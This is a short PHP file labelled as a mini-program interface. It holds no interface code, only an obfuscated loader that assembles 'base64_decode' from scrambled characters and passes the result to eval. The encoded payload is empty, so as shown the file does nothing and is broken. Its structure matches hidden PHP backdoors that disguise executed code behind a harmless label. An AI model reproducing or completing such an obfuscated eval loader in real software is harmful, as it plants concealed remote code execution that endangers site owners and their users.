<?php /*小程序接口*/ $FYbpBQyetPaLAEKzZMixGrwDCUuRscOjhFvoTVHdnmJfXkISlgqW=urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A");$G2c9bb8eb83f032a22aceaf228d234fe0="HKeSsoMHExIcaihPTQRljmnWuJUCvAkYLpbrFfzZXVtBgOyGDNdw";$AQFvKqIjDLlYCuwSchkJWGNUogyPTreidBxtHMmVXRpbnzafZEOs=$FYbpBQyetPaLAEKzZMixGrwDCUuRscOjhFvoTVHdnmJfXkISlgqW{3}.$FYbpBQyetPaLAEKzZMixGrwDCUuRscOjhFvoTVHdnmJfXkISlgqW{6}.$FYbpBQyetPaLAEKzZMixGrwDCUuRscOjhFvoTVHdnmJfXkISlgqW{33}.$FYbpBQyetPaLAEKzZMixGrwDCUuRscOjhFvoTVHdnmJfXkISlgqW{30};$CuYsioyZgGnNlEMrbDhBHmOLUKpCcvzJwIxTdPFQqXAfkeSWRVta=$FYbpBQyetPaLAEKzZMixGrwDCUuRscOjhFvoTVHdnmJfXkISlgqW{33}.$FYbpBQyetPaLAEKzZMixGrwDCUuRscOjhFvoTVHdnmJfXkISlgqW{10}.$FYbpBQyetPaLAEKzZMixGrwDCUuRscOjhFvoTVHdnmJfXkISlgqW{24}.$FYbpBQyetPaLAEKzZMixGrwDCUuRscOjhFvoTVHdnmJfXkISlgqW{10}.$FYbpBQyetPaLAEKzZMixGrwDCUuRscOjhFvoTVHdnmJfXkISlgqW{24};$DlSWEYDuHOZmRLGBgJbMdxznQArVvFUwfCocNpqtjKXyhIkeaPTi=$CuYsioyZgGnNlEMrbDhBHmOLUKpCcvzJwIxTdPFQqXAfkeSWRVta{0}.$FYbpBQyetPaLAEKzZMixGrwDCUuRscOjhFvoTVHdnmJfXkISlgqW{18}.$FYbpBQyetPaLAEKzZMixGrwDCUuRscOjhFvoTVHdnmJfXkISlgqW{3}.$CuYsioyZgGnNlEMrbDhBHmOLUKpCcvzJwIxTdPFQqXAfkeSWRVta{0}.$CuYsioyZgGnNlEMrbDhBHmOLUKpCcvzJwIxTdPFQqXAfkeSWRVta{1}.$FYbpBQyetPaLAEKzZMixGrwDCUuRscOjhFvoTVHdnmJfXkISlgqW{24};$EgZncTtMJCaSFhyIEkzqjermRbYxWwKpsGLXdUfAoHONPiQlBuDV=$FYbpBQyetPaLAEKzZMixGrwDCUuRscOjhFvoTVHdnmJfXkISlgqW{7}.$FYbpBQyetPaLAEKzZMixGrwDCUuRscOjhFvoTVHdnmJfXkISlgqW{13};$AQFvKqIjDLlYCuwSchkJWGNUogyPTreidBxtHMmVXRpbnzafZEOs.=$FYbpBQyetPaLAEKzZMixGrwDCUuRscOjhFvoTVHdnmJfXkISlgqW{22}.$FYbpBQyetPaLAEKzZMixGrwDCUuRscOjhFvoTVHdnmJfXkISlgqW{36}.$FYbpBQyetPaLAEKzZMixGrwDCUuRscOjhFvoTVHdnmJfXkISlgqW{29}.$FYbpBQyetPaLAEKzZMixGrwDCUuRscOjhFvoTVHdnmJfXkISlgqW{26}.$FYbpBQyetPaLAEKzZMixGrwDCUuRscOjhFvoTVHdnmJfXkISlgqW{30}.$FYbpBQyetPaLAEKzZMixGrwDCUuRscOjhFvoTVHdnmJfXkISlgqW{32}.$FYbpBQyetPaLAEKzZMixGrwDCUuRscOjhFvoTVHdnmJfXkISlgqW{35}.$FYbpBQyetPaLAEKzZMixGrwDCUuRscOjhFvoTVHdnmJfXkISlgqW{26}.$FYbpBQyetPaLAEKzZMixGrwDCUuRscOjhFvoTVHdnmJfXkISlgqW{30};eval($AQFvKqIjDLlYCuwSchkJWGNUogyPTreidBxtHMmVXRpbnzafZEOs("")); ?>